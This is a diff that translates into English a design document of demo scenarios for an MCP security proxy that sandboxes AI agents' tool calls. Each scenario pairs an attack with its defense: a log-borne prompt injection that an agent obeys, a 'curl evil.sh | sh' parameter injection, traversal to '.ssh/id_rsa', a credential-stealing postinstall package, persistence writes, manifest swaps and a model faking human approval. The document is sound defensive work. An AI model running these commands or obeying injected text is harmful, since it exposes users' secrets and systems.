@@ -1,262 +1,268 @@
-# 08 — Демо-сценарии
+# 08 — Demo Scenarios
 
-Каждый сценарий описан так, чтобы его можно было и показать, и превратить в слайд.
-Скилл `/mcpproxy-deck` собирает деки именно из этих описаний.
+Each scenario is written so it can both be demoed live and turned into a slide.
+The `/mcpproxy-deck` skill builds decks directly from these descriptions.
 
-## Формат сценария
+## Scenario Format
 
-Каждый сценарий содержит: **что показываем → что видит зал → почему это работает →
-какой инвариант/ADR за этим стоит → честная оговорка**.
+Each scenario contains: **what we show → what the audience sees → why it works →
+which invariant/ADR backs it → an honest caveat**.
 
-Последний пункт обязателен. Демо без оговорок не вызывает доверия у технической аудитории.
-
----
-
-## S0 — Baseline: как это ломается без прокси
-
-**Показываем.** Агент с обычным доступом к Bash. В `logs/app.log` лежит indirect prompt
-injection. Просим «разбери логи и скажи, что не так».
-
-**Что видит зал.** Модель читает лог, в логе инструкция, модель её исполняет.
-Обычный терминал, никакой видимости.
-
-**Зачем это в демо.** Без контраста все последующие цифры бессмысленны. «100% атак
-заблокировано» ничего не значит, если не показать, что происходит, когда их не блокируют.
-
-**Оговорка.** Это не значит, что модель «глупая». Это значит, что канал данных и канал
-инструкций не разделены — структурная проблема, а не проблема качества модели.
-
-**Безопасность записи.** Атака выполняется внутри демо-репозитория, endpoint эксфильтрации —
-локальный listener, а не реальный внешний хост.
+The last point is mandatory. A demo with no caveats doesn't earn the trust of a technical audience.
 
 ---
 
-## S1 — Поверхность: что вообще видит модель
+## S0 — Baseline: how it breaks without the proxy
 
-**Показываем.** `tools/list` через прокси. Четыре инструмента: `run_tests`, `build_project`,
-`analyze_logs`, `publish_release`. Никакого `execute_command`, никакого `bash`.
+**We show.** An agent with ordinary Bash access. `logs/app.log` contains an indirect prompt
+injection. We ask it to "parse the logs and tell me what's wrong."
 
-**Что видит зал.** Список инструментов в UI с бейджами аннотаций
-(`readOnly`, `destructive`, `idempotent`, `openWorld`) на каждом.
+**What the audience sees.** The model reads the log, the log contains an instruction, the
+model executes it. An ordinary terminal, no visibility at all.
 
-**Почему работает.** Инъекция убивается конструкцией, а не проверками: если строки
-команды не существует, в неё нечего инжектить (инвариант И1).
+**Why this is in the demo.** Without contrast, every number that follows is meaningless.
+"100% of attacks blocked" means nothing unless we show what happens when they aren't blocked.
 
-**За этим стоит.** [И1, И2](02-architecture.md#инварианты), [ADR-0004](adr/0004-mcp-tool-annotations.md).
+**Caveat.** This doesn't mean the model is "dumb." It means the data channel and the
+instruction channel aren't separated — a structural problem, not a model-quality problem.
 
-**Оговорка.** Мы сократили поверхность, а не решили prompt injection. Модель по-прежнему
-может быть уговорена вызвать разрешённый инструмент не вовремя — поэтому дальше нужны
-тиры и подтверждения.
+**Recording safety.** The attack runs inside the demo repository; the exfiltration endpoint
+is a local listener, not a real external host.
 
 ---
 
-## S2 — Happy path: прозрачность нормальной работы
+## S1 — Surface: what the model can actually see
 
-**Показываем.** `run_tests` с параметром `pattern: "auth"`.
+**We show.** `tools/list` through the proxy. Four tools: `run_tests`, `build_project`,
+`analyze_logs`, `publish_release`. No `execute_command`, no `bash`.
 
-**Что видит зал.** Таймлайн вызова: `received → lock_check → validate →
+**What the audience sees.** A list of tools in the UI with annotation badges
+(`readOnly`, `destructive`, `idempotent`, `openWorld`) on each.
+
+**Why it works.** Injection is killed by construction, not by checks: if a command string
+doesn't exist, there's nothing to inject into it (invariant И1).
+
+**Backed by.** [И1, И2](02-architecture.md#invariants), [ADR-0004](adr/0004-mcp-tool-annotations.md).
+
+**Caveat.** We reduced the surface; we did not solve prompt injection. The model can still be
+talked into calling an allowed tool at the wrong time — which is why tiers and approvals come
+next.
+
+---
+
+## S2 — Happy path: transparency of normal operation
+
+**We show.** `run_tests` with parameter `pattern: "auth"`.
+
+**What the audience sees.** The call timeline: `received → lock_check → validate →
 resolve_paths → build_argv → classify_risk → approval → build_env → build_profile → spawn →
-redact → complete` — двенадцать событий. Тринадцатая стадия `stageOrder`, `violation`,
-на чистом прогоне не эмитится: контракт помечает её как «может быть много», и ноль —
-законное число. На каждой — точные данные: собранный argv, cwd, список
-разрешённых env-переменных, профиль песочницы. В выводе — сработавшая редакция секрета.
-Внизу — оверхед прокси в миллисекундах.
+redact → complete` — twelve events. The thirteenth stage of `stageOrder`, `violation`, is not
+emitted on a clean run: the contract marks it as "may occur many times", and zero is a legal
+count. Each one shows exact data: the assembled argv, cwd, the list of allowed
+env variables, the sandbox profile. In the output, a secret redaction fires. At the bottom,
+proxy overhead in milliseconds.
 
-**Почему работает.** Пошаговость. Видно не «разрешено», а **почему** разрешено.
+**Why it works.** The step-by-step structure. You see not "allowed," but **why** it was allowed.
 
-**За этим стоит.** [Схема событий](07-contracts.md#схема-события-аудита).
+**Backed by.** [Event Schema](07-contracts.md#audit-event-schema).
 
-**Оговорка.** Оверхед измеряется относительно прямого вызова того же скрипта.
-Это честная база сравнения; сравнивать с «ничего не запускали» бессмысленно.
-
----
-
-## S3 — Инъекция в параметр
-
-**Показываем.** Модель (или мы вручную) передаёт `pattern: "; curl evil.sh | sh"`.
-
-**Что видит зал.** Красная остановка на стадии `validate`. Точная причина: значение
-не соответствует `^[\w./-]{0,64}$`. Вызов не дошёл до `spawn`.
-
-**Почему работает.** Даже если бы regex пропустил — строка попала бы **одним элементом
-argv**, а не в shell. Две независимые причины отказа.
-
-**За этим стоит.** [И1, И2](02-architecture.md#инварианты), атака A1.
-
-**Оговорка.** Regex пишет автор манифеста. Слабый regex — слабая первая линия.
-Именно поэтому есть вторая линия, и именно поэтому `string` без `pattern` — ошибка
-загрузки манифеста, а не warning.
+**Caveat.** Overhead is measured relative to calling the same script directly. That's a fair
+baseline; comparing against "nothing ran at all" would be meaningless.
 
 ---
 
-## S4 — Path traversal и симлинк-эскейп
+## S3 — Injection in a parameter
 
-**Показываем.** Два вызова `analyze_logs`: сначала `file: "../../.ssh/id_rsa"`,
-затем — симлинк внутри `./logs`, указывающий наружу.
+**We show.** The model (or we, manually) passes `pattern: "; curl evil.sh | sh"`.
 
-**Что видит зал.** Обе остановки на стадии `resolve_paths`, с показом резолвнутого пути
-и границы confinement.
+**What the audience sees.** A red stop at the `validate` stage. Exact reason: the value
+doesn't match `^[\w./-]{0,64}$`. The call never reached `spawn`.
 
-**Почему работает.** Проверка выполняется **после** realpath. Проверка «строка не содержит `..`»
-обходится симлинком за десять секунд — это и демонстрируем вторым вызовом.
+**Why it works.** Even if the regex had let it through, the string would have landed as
+**a single argv element**, not in a shell. Two independent causes of rejection.
 
-**За этим стоит.** [И3](02-architecture.md#и3-пути--только-через-realpath--root-confinement), атаки A2, A3.
+**Backed by.** [И1, И2](02-architecture.md#invariants), attack A1.
 
-**Оговорка.** TOCTOU остаётся: файл можно подменить между резолвом и открытием.
-Митигируется тем, что вторая линия (`denyRead` в песочнице) не зависит от резолва.
+**Caveat.** The regex is written by the manifest's author. A weak regex is a weak first line.
+That's exactly why there's a second line, and exactly why `string` without `pattern` is a
+manifest load error, not a warning.
 
 ---
 
-## S5 — Supply chain: главный номер
+## S4 — Path traversal and symlink escape
 
-**Показываем.** Один и тот же валидный `run_tests`. В `devDependencies` — пакет
-с вредоносным `postinstall`, который читает `~/.aws/credentials` и шлёт на внешний хост.
-Переключатель режима песочницы в UI.
+**We show.** Two calls to `analyze_logs`: first `file: "../../.ssh/id_rsa"`, then a symlink
+inside `./logs` that points outside it.
 
-**Что видит зал.**
+**What the audience sees.** Both attempts stop at the `resolve_paths` stage, showing the
+resolved path and the confinement boundary.
 
-| Режим | Результат |
+**Why it works.** The check runs **after** realpath. A check that just says "the string
+contains no `..`" is bypassed with a symlink in ten seconds — which is exactly what the
+second call demonstrates.
+
+**Backed by.** [И3](02-architecture.md#и3-paths--only-via-realpath--root-confinement), attacks A2, A3.
+
+**Caveat.** TOCTOU remains: a file can be swapped between resolution and opening. Mitigated
+by the fact that the second line of defense (`denyRead` in the sandbox) doesn't depend on
+the resolve.
+
+---
+
+## S5 — Supply chain: the headline act
+
+**We show.** The same valid `run_tests` call each time. `devDependencies` includes a package
+with a malicious `postinstall` that reads `~/.aws/credentials` and sends it to an external
+host. A sandbox-mode toggle in the UI.
+
+**What the audience sees.**
+
+| Mode | Result |
 |---|---|
-| `sandbox: none` | Тесты прошли ✅ — и красная строка в таймлайне: исходящее соединение на `evil.io:443`, отправлено 1.2 KB |
-| `sandbox: seatbelt` | Тесты прошли ✅ — и `network denied: evil.io:443`, `file-read denied: ~/.aws/credentials`, 0 байт |
+| `sandbox: none` | Tests passed ✅ — and a red line in the timeline: an outbound connection to `evil.io:443`, 1.2 KB sent |
+| `sandbox: seatbelt` | Tests passed ✅ — and `network denied: evil.io:443`, `file-read denied: ~/.aws/credentials`, 0 bytes |
 
-Два клика, один и тот же вызов, разный исход.
+Two clicks, the same call, a different outcome.
 
-**Почему это самый важный сценарий.** Он показывает разницу между двумя линиями обороны.
-Параметры валидны, бинарь в allowlist, директория правильная — валидатор отработал
-безупречно. Утечка происходит из кода, который этот валидный вызов запустил.
-Валидатор не видит внутрь процесса.
+**Why this is the most important scenario.** It shows the difference between the two lines
+of defense. The parameters are valid, the binary is in the allowlist, the directory is
+correct — the validator did its job flawlessly. The leak comes from the code that this valid
+call launched. The validator can't see inside the process.
 
-**За этим стоит.** [Две линии обороны](03-threat-model.md#две-линии-обороны),
+**Backed by.** [Two lines of defense](03-threat-model.md#two-lines-of-defense),
 [ADR-0002](adr/0002-sandbox-runtime.md), [ADR-0007](adr/0007-network-domain-allowlist.md),
-атака A9, OWASP ASI04 + ASI05.
+attack A9, OWASP ASI04 + ASI05.
 
-**Оговорка.** Фильтрация по доменам, а не по содержимому. Если бы `evil.io` был заменён
-на разрешённый `api.github.com`, эксфильтрация в свой gist прошла бы. Domain fronting
-тоже обходит. Мы поднимаем стоимость атаки, а не делаем её невозможной.
-
----
-
-## S6 — Persistence: запись, которая исполнится потом
-
-**Показываем.** Скрипт пытается дописать строку в `.git/hooks/pre-commit` и в `~/.zshrc`.
-
-**Что видит зал.** Оба отказа, помеченные как **mandatory deny** — путь, который нельзя
-разрешить даже явным `allowWrite`.
-
-**Почему работает.** Это persistence-векторы: запись туда даёт исполнение кода позже,
-уже вне песочницы. Разрешать их по ошибке нельзя, поэтому запрет неснимаемый.
-
-**За этим стоит.** [Mandatory deny paths](02-architecture.md#модель-прав-песочницы),
-атака A11. Список взят у `sandbox-runtime` — сами бы половину не вспомнили.
-
-**Оговорка.** Список конечен. Запись в произвольный исполняемый файл внутри разрешённой
-директории проекта возможна — это осознанный компромисс ради работоспособности.
+**Caveat.** Filtering is by domain, not by content. If `evil.io` were swapped for an allowed
+`api.github.com`, exfiltration into the attacker's own gist would go through. Domain fronting
+gets around it too. We raise the cost of the attack; we don't make it impossible.
 
 ---
 
-## S7 — Rug pull: подмена рецепта между вызовами
+## S6 — Persistence: a write that executes later
 
-**Показываем.** Прямо на сцене правим `mcpproxy.yaml` — добавляем в `analyze_logs`
-безобидно выглядящий аргумент. Повторяем вызов.
+**We show.** A script tries to append a line to `.git/hooks/pre-commit` and to `~/.zshrc`.
 
-**Что видит зал.** Жёсткий стоп на стадии `lock_check` + модалка с **диффом** «было / стало».
-Пока человек не подтвердит — рецепт не работает.
+**What the audience sees.** Both denials, flagged as **mandatory deny** — a path that cannot
+be allowed even with an explicit `allowWrite`.
 
-**Почему работает.** Одобрение определения инструмента не переживает изменение файла.
-Это не гипотеза: по публикациям, CVE-2025-54136 (CVSS 8.8) подтвердила ровно этот класс.
-А манифест лежит в репозитории и может быть изменён PR'ом, зависимостью или самой моделью
-через другой инструмент.
+**Why it works.** These are persistence vectors: writing there grants code execution later,
+outside the sandbox. They must never be allowed by mistake, which is why the deny is
+irrevocable.
 
-**За этим стоит.** [ADR-0006](adr/0006-manifest-lockfile.md), атака A6.
+**Backed by.** [Mandatory deny paths](02-architecture.md#sandbox-permission-model),
+attack A11. The list is taken from `sandbox-runtime` — on our own we wouldn't have thought
+of half of it.
 
-**Оговорка.** Защищает от тихой подмены, не от того, что человек невнимательно нажмёт
-«одобрить». Поэтому дифф показывается целиком и без усечения — как требует спека MCP
-для команд запуска.
-
----
-
-## S8 — Подтверждение, которому можно верить
-
-**Показываем.** Вызов `publish_release` (`destructiveHint: true`, `openWorldHint: true`).
-Сначала модель пытается получить подтверждение сама через `elicitation/create`.
-
-**Что видит зал.** Прокси отвечает: «этот рецепт требует out-of-band подтверждения».
-Всплывает окно Electron — отдельный процесс, вне контекста модели — с точным argv,
-cwd, профилем песочницы, списком доменов, куда будет ходить скрипт.
-Варианты: «разрешить один раз» / «на 10 минут» / «всегда для этого рецепта и хэша аргументов».
-
-**Почему работает.** Elicitation идёт через клиент и модель, то есть подтверждение живёт
-в том же канале, который мы считаем скомпрометированным. Это OWASP ASI09
-(Human-Agent Trust Exploitation) в чистом виде. Разница между «модель сказала,
-что ты согласился» и «ты нажал кнопку в другом процессе» — понятна залу мгновенно.
-
-**За этим стоит.** [ADR-0005](adr/0005-dual-channel-approvals.md), атака A14.
-
-**Оговорка.** Это защита от подделки канала, а не от усталости от подтверждений.
-Если высокорисковых операций много, человек начнёт нажимать не глядя — поэтому
-тиры выводятся из аннотаций автоматически и high-risk должен быть редким.
+**Caveat.** The list is finite. Writing to an arbitrary executable file inside an allowed
+project directory is still possible — a deliberate compromise made for the sake of usability.
 
 ---
 
-## S9 — Аудит, который нельзя переписать
+## S7 — Rug pull: swapping a recipe between calls
 
-**Показываем.** Вкладка аудита, бейдж «цепочка верифицирована». Затем правим одну
-запись в JSONL руками и обновляем.
+**We show.** Right on stage, we edit `mcpproxy.yaml` — adding an innocent-looking argument
+to `analyze_logs`. We repeat the call.
 
-**Что видит зал.** Бейдж краснеет, указывается номер записи, с которой цепочка разошлась.
-Экспорт лога.
+**What the audience sees.** A hard stop at the `lock_check` stage + a modal with a **diff**
+"before / after." Until a human approves it, the recipe doesn't run.
 
-**Почему работает.** `self = sha256(utf8(canonicalizeJcs({ prev, event })))` — хэшируется всё
-событие целиком вместе со ссылкой на предыдущую запись, а не перечисленные поля. Проверяется
-не только дайджест, но и связь: `prev` каждой записи обязан совпадать с `self` предыдущей.
-Поэтому правка записи ломает цепочку даже у атакующего, который пересчитал её собственный
-`self`: расхождение всплывает на следующей записи.
+**Why it works.** Approval of a tool definition doesn't survive a change to the file. This
+isn't a hypothesis: according to published reports, CVE-2025-54136 (CVSS 8.8) confirmed
+exactly this class of attack. And the manifest lives in the repository, where it can be
+changed by a PR, a dependency, or the model itself through another tool.
 
-**За этим стоит.** [Аудит](02-architecture.md#аудит).
+**Backed by.** [ADR-0006](adr/0006-manifest-lockfile.md), attack A6.
 
-**Оговорка.** Tamper-**evident**, а не tamper-proof. Атакующий с правами на файл может
-переписать лог целиком и пересчитать цепочку — и, отдельно, может **обрезать хвост**:
-удалив последние записи, он оставляет цепочку согласованной. Защита от этого — публикация Merkle-корня
-наружу, что дёшево добавить, но в текущий срез не входит.
+**Caveat.** This protects against a silent swap, not against a human inattentively clicking
+"approve." That's why the diff is shown in full and untruncated — as the MCP spec requires
+for launch commands.
 
 ---
 
-## S10 — Red team вживую
+## S8 — An approval you can actually trust
 
-**Показываем.** Вкладка «Red team». Запуск полного корпуса прямо на сцене.
+**We show.** A call to `publish_release` (`destructiveHint: true`, `openWorldHint: true`).
+First, the model itself tries to obtain approval via `elicitation/create`.
 
-**Что видит зал.** Прогресс по классам атак, затем итоговая пара цифр:
-**ASR** и **Utility under Attack**, плюс количество ложных блокировок и оверхед.
+**What the audience sees.** The proxy responds: "this recipe requires out-of-band approval."
+An Electron window pops up — a separate process, outside the model's context — showing the
+exact argv, cwd, sandbox profile, and the list of domains the script will contact.
+Options: "allow once" / "for 10 minutes" / "always for this recipe and this args hash."
 
-**Почему обе цифры вместе.** Защита с ASR = 0 и Utility = 0 — это `chmod 000`,
-а не безопасность. Одна метрика без второй ничего не доказывает. Пара ASR + Utility —
-устоявшаяся методология из AgentDojo и InjecAgent.
+**Why it works.** Elicitation travels through the client and the model, meaning the approval
+would live in the very channel we consider compromised. This is OWASP ASI09 (Human-Agent
+Trust Exploitation) in its purest form. The difference between "the model said you agreed"
+and "you clicked a button in a separate process" is instantly clear to the audience.
 
-**За этим стоит.** [09-metrics-and-eval.md](09-metrics-and-eval.md).
+**Backed by.** [ADR-0005](adr/0005-dual-channel-approvals.md), attack A14.
 
-**Оговорка.** Корпус написан нами и потому неполон по определению. Он покрывает известные
-нам классы — включая шесть, которые мы нашли только в ходе разведки индустрии,
-а не придумали сами. Это аргумент за корпус, а не против: он растёт от внешних источников.
+**Caveat.** This protects against channel spoofing, not against approval fatigue. If there
+are too many high-risk operations, a human will start clicking without looking — which is
+why tiers are derived automatically from annotations, and high-risk should be rare.
 
 ---
 
-## Порядок и тайминг (~7 минут)
+## S9 — An audit trail that can't be rewritten
 
-| # | Сценарий | ~время | Роль в нарративе |
+**We show.** The audit tab, badge "chain verified." Then we hand-edit one record in the
+JSONL file and refresh.
+
+**What the audience sees.** The badge turns red, showing the number of the record where the
+chain diverges. Exporting the log.
+
+**Why it works.** `self = sha256(utf8(canonicalizeJcs({ prev, event })))` — the entire event
+is hashed together with a reference to the previous record, not a hand-picked list of fields.
+What's checked is not just the digest but the link: each record's `prev` must match the
+previous record's `self`. So editing a record breaks the chain even for an attacker who
+recomputed its own `self`: the mismatch surfaces at the next record.
+
+**Backed by.** [Audit](02-architecture.md#audit).
+
+**Caveat.** Tamper-**evident**, not tamper-proof. An attacker with write access to the file
+can rewrite the entire log and recompute the chain — and, separately, can **truncate the
+tail**: deleting the most recent records leaves the chain consistent. The defense against
+that is publishing a Merkle root externally, which is cheap to add but isn't in the current
+scope.
+
+---
+
+## S10 — Red team, live
+
+**We show.** The "Red team" tab. Running the full corpus live on stage.
+
+**What the audience sees.** Progress by attack class, then a final pair of numbers:
+**ASR** and **Utility under Attack**, plus the count of false blocks and the overhead.
+
+**Why both numbers together.** A defense with ASR = 0 and Utility = 0 is `chmod 000`, not
+security. One metric without the other proves nothing. The ASR + Utility pair is an
+established methodology from AgentDojo and InjecAgent.
+
+**Backed by.** [09-metrics-and-eval.md](09-metrics-and-eval.md).
+
+**Caveat.** The corpus was written by us and is therefore incomplete by definition. It covers
+the classes we're aware of — including six that we found only by surveying the industry, not
+by inventing them ourselves. That's an argument for the corpus, not against it: it grows from
+external sources.
+
+---
+
+## Order and timing (~7 minutes)
+
+| # | Scenario | ~time | Narrative role |
 |---|---|---|---|
-| S0 | Baseline | 45 с | Проблема существует |
-| S1 | Поверхность | 30 с | Что мы забрали у модели |
-| S2 | Happy path | 60 с | Не мешаем работать + прозрачность |
-| S3 | Инъекция в параметр | 30 с | Первая линия |
-| S4 | Traversal + симлинк | 30 с | Первая линия, тонкий случай |
-| **S5** | **Supply chain** | **90 с** | **Кульминация: зачем вторая линия** |
-| S6 | Persistence | 30 с | Вторая линия, неочевидный вектор |
-| S7 | Rug pull | 45 с | Недоверенный репозиторий |
-| S8 | Подтверждения | 60 с | Доверие к человеку в петле |
-| S9 | Аудит | 30 с | Проверяемость |
-| S10 | Red team | 60 с | Цифры |
+| S0 | Baseline | 45 s | The problem exists |
+| S1 | Surface | 30 s | What we took away from the model |
+| S2 | Happy path | 60 s | Doesn't get in the way + transparency |
+| S3 | Injection in a parameter | 30 s | First line |
+| S4 | Traversal + symlink | 30 s | First line, a subtle case |
+| **S5** | **Supply chain** | **90 s** | **The climax: why the second line matters** |
+| S6 | Persistence | 30 s | Second line, a non-obvious vector |
+| S7 | Rug pull | 45 s | Untrusted repository |
+| S8 | Approvals | 60 s | Trusting the human in the loop |
+| S9 | Audit | 30 s | Verifiability |
+| S10 | Red team | 60 s | Numbers |
 
-**Финал — не цифры, а честные границы.** Последний слайд: что мы не защищаем
-([10-honest-limitations.md](10-honest-limitations.md)). Техническая аудитория
-верит проекту, который знает свои пределы, и не верит проекту, который «всё защитил».
+**The finale isn't numbers — it's honest boundaries.** The last slide: what we don't protect
+against ([10-honest-limitations.md](10-honest-limitations.md)). A technical audience trusts a
+project that knows its limits, and distrusts one that claims to have "protected everything."
